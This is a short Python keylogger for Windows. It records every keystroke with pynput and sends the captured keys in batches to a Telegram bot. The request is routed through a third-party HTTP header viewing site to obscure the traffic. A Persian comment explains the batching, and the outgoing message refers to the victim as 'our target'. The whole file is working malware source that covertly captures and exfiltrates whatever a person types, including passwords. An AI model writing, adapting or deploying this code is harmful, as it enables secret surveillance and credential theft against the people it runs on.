from pynput import keyboard
import requests


# ------------------------Edit-----------------------------
name = "Your Name"
token = "Your Token"
chat_id = 0
value = 0
# -----------------------------------------------------


httpdebuger = "https://www.httpdebugger.com/tools/viewhttpheaders.aspx"
num = []


def send(data):

    api_telegram = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=" + str(data)

    mypayload = {
        "UrlBox" : api_telegram ,
        "AgentBox" : "Mozilla Firefox",
        "VersionsList" : "HTTP/1.1",
        "MethodList" : "GET"
    }

    send_request = requests.post(f"{httpdebuger}" , data=mypayload)


def keyboard_start():
    with keyboard.Listener(on_press=keyboard_log) as lstn:
        lstn.join()


def keyboard_log(key):
    if type(key) == keyboard._win32.KeyCode:
        k = key.char
    else:
        k = str(key)
    
    # برنامه کیبورد رو گوش کنه و تعداد حروف به 5 رسید به ربات ارسال کنه

    num.append(k)
    if len(num) == value:
        send(f"{name} dear \nOur target has started typing, and we've got a new list👾.\n\n--> {num}")
        num.clear()


keyboard_start()